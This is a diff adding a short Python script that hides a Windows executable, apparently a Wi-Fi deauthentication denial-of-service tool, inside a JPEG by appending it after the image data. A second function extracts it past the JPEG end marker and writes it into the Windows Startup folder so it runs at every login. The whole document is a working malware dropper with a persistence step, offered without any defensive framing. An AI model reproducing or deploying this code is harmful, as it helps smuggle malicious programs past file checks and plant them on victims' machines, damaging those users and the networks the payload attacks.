@@ -1,0 +1,14 @@
+#!/bin/python3
+
+def hide_exe():
+    with open('dragon.jpeg', 'ab') as f, open('C:/Users/Cooper/Desktop/WifiDosDeauth.exe', 'rb') as e:
+        f.write(e.read())#HIDING EXECUTABLE IN JPEG
+
+def release_the_kracken():
+    with open('dragon.jpeg', 'rb') as f:#EXTRACTING EXECUTABLE FROM IMAGE
+        content = f.read()
+        off = content.index(bytes.fromhex('FFD9'))
+        f.seek(off + 2)
+    
+        with open('C:/Users/Cooper/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/newfile.exe', 'ab') as e:
+            e.write(f.read())
